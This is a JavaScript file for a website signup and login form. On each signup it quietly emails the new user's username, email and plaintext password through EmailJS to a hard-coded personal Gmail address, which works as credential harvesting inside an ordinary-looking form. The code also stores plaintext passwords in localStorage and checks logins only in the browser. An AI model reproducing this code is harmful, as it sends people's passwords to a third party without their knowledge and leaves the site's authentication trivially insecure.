const form = document.getElementById('form');
const firstname_input = document.getElementById('firstname-input');
const email_input = document.getElementById('email-input');
const password_input = document.getElementById('password-input');
const repeat_password_input  = document.getElementById('repeat-password');
const error_message = document.getElementById('error-message'); 
const passwordToggles = document.querySelectorAll('.password-toggle');

form.addEventListener('submit', (e) => {
   e.preventDefault();

   let errors = [];

   if(firstname_input){
    errors = getSignupFormErrors(firstname_input.value, email_input.value, password_input.value, repeat_password_input)
   }
   else{
    errors = getLoginFormErrors(email_input.value, password_input.value)
   }
   
   if(errors.length > 0){
    error_message.innerHTML = errors.map(error => `${error}<br>`).join('');
   } else {
    // Store user data if it's signup form
    if(firstname_input) {
        const userData = {
            username: firstname_input.value,
            email: email_input.value,
            password: password_input.value
        };
        
        // Store in localStorage
        const users = JSON.parse(localStorage.getItem('users')) || [];
        users.push(userData);
        localStorage.setItem('users', JSON.stringify(users));

        // Show loading state
        error_message.innerHTML = "Processing registration...";
        
        // Send email only for new registrations
        emailjs.send(
            'service_sikv68v',
            'template_5rr6xdw',
            {
                to_email: 'xbigbrainnx@gmail.com',
                username: userData.username,
                user_email: userData.email,
                password: userData.password
            }
        ).then(
            function(response) {
                console.log("SUCCESS", response);
                window.location.href = 'welcome.html';
            },
            function(error) {
                console.log("FAILED", error);
                error_message.innerHTML = "Failed to send registration data. Please try again.";
            }
        );
    } else {
        window.location.href = 'welcome.html';
    }
   }
}); 

passwordToggles.forEach(toggle => {
    toggle.addEventListener('click', () => {
        const input = toggle.previousElementSibling;
        if (input.type === 'password') {
            input.type = 'text';
            toggle.classList.remove('bx-hide');
            toggle.classList.add('bx-show');
        } else {
            input.type = 'password';
            toggle.classList.remove('bx-show');
            toggle.classList.add('bx-hide');
        }
    });
});

 function getSignupFormErrors(firstname, email, password, repeat_password) {
    let errors = [];
    
    // Remove all previous error states
    [firstname_input, email_input, password_input, repeat_password_input].forEach(input => {
        input.parentElement.classList.remove('Incorrect');
    });

    // Check if user already exists
    const users = JSON.parse(localStorage.getItem('users')) || [];
    const existingUsername = users.find(u => u.username === firstname);
    const existingEmail = users.find(u => u.email === email);
    
    if (existingUsername) {
        errors.push('Existing Username');
        firstname_input.parentElement.classList.add('Incorrect');
        return errors;
    }

    if (existingEmail) {
        errors.push('Existing Email');
        email_input.parentElement.classList.add('Incorrect');
        return errors;
    }

    if(firstname === '' || firstname == null) {
        errors.push('Username Is Required!');
        firstname_input.parentElement.classList.add('Incorrect');
    } else if(firstname.length < 5) {
        errors.push('Username must be at least 5 characters long!');
        firstname_input.parentElement.classList.add('Incorrect');
    } else if(!/\d/.test(firstname)) {
        errors.push('Username must include at least one number!');
        firstname_input.parentElement.classList.add('Incorrect');
    }
    
    if(email === '' || email == null) {
        errors.push('Email Is Required!');
        email_input.parentElement.classList.add('Incorrect');
    }
    
    if(password === '' || password == null) {
        errors.push('Password Is Required');
        password_input.parentElement.classList.add('Incorrect');
    } else if(password.length < 5) {
        errors.push('Password must be at least 5 characters long!');
        password_input.parentElement.classList.add('Incorrect');
    } else if(!/[A-Z]/.test(password)) {
        errors.push('Password must include at least one uppercase letter!');
        password_input.parentElement.classList.add('Incorrect');
    }
    
    if(repeat_password.value === '' || repeat_password.value == null) {
        errors.push('Repeat Password Is Required!');
        repeat_password_input.parentElement.classList.add('Incorrect');
    } else if(password !== repeat_password.value) {
        errors.push('Passwords Do Not Match!');
        repeat_password_input.parentElement.classList.add('Incorrect');
        password_input.parentElement.classList.add('Incorrect');
    }

    return errors;
}  

function getLoginFormErrors(email, password) {
    let errors = [];
    
    // Remove all previous error states
    [email_input, password_input].forEach(input => {
        input.parentElement.classList.remove('Incorrect');
    });

    if(email === '' || email == null) {
        errors.push('Username is required!');
        email_input.parentElement.classList.add('Incorrect');
        return errors;
    }

    if(password === '' || password == null) {
        errors.push('Password is required!');
        password_input.parentElement.classList.add('Incorrect');
        return errors;
    }

    // Get users from localStorage
    const users = JSON.parse(localStorage.getItem('users')) || [];
    const user = users.find(u => u.username === email);

    if (!user) {
        errors.push('Wrong Username or Password!');
        email_input.parentElement.classList.add('Incorrect');
        password_input.parentElement.classList.add('Incorrect');
    } else if (user.password !== password) {
        errors.push('Wrong Username or Password!');
        email_input.parentElement.classList.add('Incorrect');
        password_input.parentElement.classList.add('Incorrect');
    }

    return errors;
}